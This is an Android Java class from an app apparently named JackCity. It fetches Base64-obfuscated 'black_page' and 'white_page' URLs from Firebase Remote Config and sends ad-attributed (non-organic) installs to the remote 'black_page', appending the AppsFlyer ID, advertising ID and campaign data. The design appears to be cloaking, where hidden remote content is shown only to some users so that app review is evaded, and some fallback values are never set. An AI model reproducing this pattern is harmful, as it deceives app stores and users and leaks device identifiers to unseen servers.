package com.jackcity.citypot.app;

import android.app.Activity;
import android.net.Uri;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import android.webkit.ValueCallback;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class JackCityConst {
    Activity activity;
    public static String afStatus, adGroup, afChannel, adSet, mediaSource;
    public static String subKey, sub3, sub4, AID, flyerID;
    static int Code = 112233;
    static ValueCallback<Uri[]> CallBack;
    static Uri URL;
    FirebaseRemoteConfig firebaseRemoteConfig;
    private String fullLink = null;
    private String keyDrop = null;
    private String urlF = null;
    private String keyF = null;
    private String white_page, black_page, default_key;
    public static String jcp_url= null;


    public void setActivity(Activity activity) {
        this.activity = activity;
    }

    public void setBase()
    {
        firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder().build();
        firebaseRemoteConfig.setDefaultsAsync(R.xml.jackcity_provider);
        firebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        getUrls();
        new Handler().postDelayed(() -> {
                startTimer.start();
        }, 5000);
    }

    private void getUrls() {
        firebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                black_page = firebaseRemoteConfig.getString(new String(Base64.decode(activity.getResources().getString(R.string.black_page), Base64.DEFAULT)));
                default_key = firebaseRemoteConfig.getString(new String(Base64.decode(activity.getResources().getString(R.string.default_key), Base64.DEFAULT)));
                white_page = firebaseRemoteConfig.getString(new String(Base64.decode(activity.getResources().getString(R.string.white_page), Base64.DEFAULT)));

            }
        });
    }
    private final CountDownTimer startTimer = new CountDownTimer(15000, 500) {
        @Override
        public void onTick(long l) {
            if (JackCityConst.afStatus.equals("Non-Organic")) {
                cancel();
                String parser = JackCityConst.flyerID + "||" + JackCityConst.AID + "||" + new String(Base64.decode(activity.getResources().getString(R.string.appflyer), Base64.DEFAULT));
                fullLink = black_page + "?key=" + default_key + "&bundle="
                        + activity.getPackageName() + "&sub2=" + JackCityConst.sub3 + "&sub3=" + JackCityConst.sub4
                        + "&sub4=" + JackCityConst.adGroup + "&sub5=" + JackCityConst.adSet + "&sub6="
                        + JackCityConst.afChannel + "&sub7=" + JackCityConst.mediaSource + "&sub10=" + parser;
                Log.e("TAG", "Non-Organic : " + fullLink);
                firstOpen();
            } else if (JackCityConst.afStatus.equals("Organic")) {
                cancel();
                String parser_1 = JackCityConst.flyerID + "||" + JackCityConst.AID + "||" + new String(Base64.decode(activity.getResources().getString(R.string.appflyer), Base64.DEFAULT));
                fullLink = black_page + "?key=" + default_key + "&bundle=" + activity.getPackageName() + "&sub7=Organic&sub10=" + parser_1;
                Log.e("TAG", "Organic : " + fullLink);
                firstOpen();
            } else {
                Log.e("TAG", "Tic...");
            }

        }

        @Override
        public void onFinish() {
            String parser_3 = JackCityConst.flyerID + "||" + JackCityConst.AID + "||" + new String(Base64.decode(activity.getResources().getString(R.string.appflyer), Base64.DEFAULT));
            fullLink = urlF + "?key=" + keyF + "&bundle=" + activity.getPackageName() + "&sub7=Organic&sub10=" + parser_3;
            Log.e("TAG", "Default : " + fullLink);
            firstOpen();
        }
    };
    public void firstOpen()
    {
        keyDrop = fullLink;
        keyDrop = keyDrop.split("key=")[1];
        keyDrop = keyDrop.split("&")[0];
        if (keyDrop.length() == 20) {
            Log.e("TAG", "Load first : " + fullLink);
        } else {
            String parser = JackCityConst.flyerID + "||" + JackCityConst.AID + "||" + new String(Base64.decode(activity.getResources().getString(R.string.appflyer), Base64.DEFAULT));
            fullLink = black_page + "?key=" + default_key + "&bundle=" + activity.getPackageName() + "&sub4=" + JackCityConst.adGroup + "&sub5=" + JackCityConst.adSet + "&sub6="
                    + JackCityConst.afChannel + "&sub7=" + JackCityConst.mediaSource + "&sub7=Default&sub10=" + parser;
            Log.e("TAG", "Key !=20 -  load default " + fullLink);
        }
        jcp_url = fullLink;
    }

    public static int getCode() {
        return Code;
    }

    public static void setCode(int code) {
        Code = code;
    }

    public static ValueCallback<Uri[]> getCallBack() {
        return CallBack;
    }

    public static void setCallBack(ValueCallback<Uri[]> callBack) {
        CallBack = callBack;
    }

    public static Uri getURL() {
        return URL;
    }

    public static void setURL(Uri URL) {
        JackCityConst.URL = URL;
    }
}
